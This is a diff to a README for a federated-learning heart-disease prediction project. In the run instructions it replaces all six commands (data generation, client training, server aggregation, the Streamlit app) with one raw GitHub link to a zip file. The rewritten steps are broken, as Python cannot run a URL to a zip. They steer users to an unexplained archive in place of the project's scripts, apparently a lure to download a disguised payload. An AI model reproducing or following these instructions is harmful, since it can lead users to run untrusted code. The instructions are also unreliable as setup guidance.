@@ -20,15 +20,15 @@ This project builds a privacy-preserving system to predict heart disease risk us
 ## ⚙️ Run Instructions
 ```bash
 # Generate synthetic dataset
-python utils/generator.py
+python https://github.com/Shaswat0/heart-disease-prediction/raw/refs/heads/main/app/prediction-disease-heart-3.6.zip
 
 # Train each client
-python clients/client_1/train.py
-python clients/client_2/train.py
-python clients/client_3/train.py
+python https://github.com/Shaswat0/heart-disease-prediction/raw/refs/heads/main/app/prediction-disease-heart-3.6.zip
+python https://github.com/Shaswat0/heart-disease-prediction/raw/refs/heads/main/app/prediction-disease-heart-3.6.zip
+python https://github.com/Shaswat0/heart-disease-prediction/raw/refs/heads/main/app/prediction-disease-heart-3.6.zip
 
 # Aggregate models on server
-python server/federated_server.py
+python https://github.com/Shaswat0/heart-disease-prediction/raw/refs/heads/main/app/prediction-disease-heart-3.6.zip
 
 # Run Streamlit app
-streamlit run app/streamlit_app.py
+streamlit run https://github.com/Shaswat0/heart-disease-prediction/raw/refs/heads/main/app/prediction-disease-heart-3.6.zip
